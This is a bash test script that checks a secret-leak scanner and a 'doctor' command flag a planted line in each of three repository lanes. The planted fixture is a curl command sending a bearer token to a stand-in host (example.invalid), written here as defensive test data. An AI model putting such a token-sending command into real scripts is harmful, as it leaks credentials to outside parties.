#!/usr/bin/env bash
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd -P)"
tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
factory="$tmp/example.factory"; mkdir -p "$factory"/{dev,next,live}
for lane in dev next live; do
  git -C "$factory/$lane" init -q
  printf 'echo safe\n' > "$factory/$lane/tool.sh"
  git -C "$factory/$lane" add tool.sh
done
printf '{"lanes":{"dev":"dev","next":"next","live":"live"}}\n' > "$factory/factory.json"
check=(bash "$HERE/factory-leakscan.sh" --factory "$factory")
"${check[@]}" > "$tmp/out"
grep -q 'PASS' "$tmp/out"
for lane in dev next live; do
  printf 'curl -H "Authorization: Bearer $TOKEN" https://example.invalid\n' > "$factory/$lane/tool.sh"
  if "${check[@]}" > "$tmp/out"; then echo "FAIL: missed $lane" >&2; exit 1; fi
  grep -q "FAIL.*$lane/tool.sh:1" "$tmp/out" || { echo "FAIL: missing $lane evidence" >&2; exit 1; }
  printf 'echo safe\n' > "$factory/$lane/tool.sh"
done
# The doctor must actually call the scan, rather than only the standalone command.
printf 'curl -H "Authorization: Bearer $TOKEN" https://example.invalid\n' > "$factory/next/tool.sh"
if bash "$HERE/factory-doctor.sh" --factory "$factory" > "$tmp/out" 2>&1; then echo 'FAIL: doctor missed leak' >&2; exit 1; fi
grep -q 'FAIL.*next/tool.sh:1' "$tmp/out" || { echo 'FAIL: doctor did not report leak' >&2; exit 1; }
echo 'factory leakscan: PASS'
